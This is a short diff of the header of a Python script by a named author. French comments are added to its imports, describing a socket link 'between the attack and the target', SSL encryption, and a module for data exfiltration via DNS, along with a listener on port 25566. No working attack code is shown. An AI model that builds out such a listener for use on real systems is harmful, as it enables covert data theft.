@@ -2,10 +2,13 @@
 # Version 0.4
 # Auteur : Raphaël KATHALUWA-LIYANAGE
 
-import socket
-import ssl
-import dns_server
+# import des libraires
+import socket       # communication entre l'attaque et la cible
+import ssl          # chiffrement des échanges
+import dns_server   # exfiltration des données via DNS
 
+# en écoute sur toutes les connexions entrantes
+# 0.0.0.0:25566
 HOST = '0.0.0.0'
 PORT = 25566
 # taille des messages : 128kB max
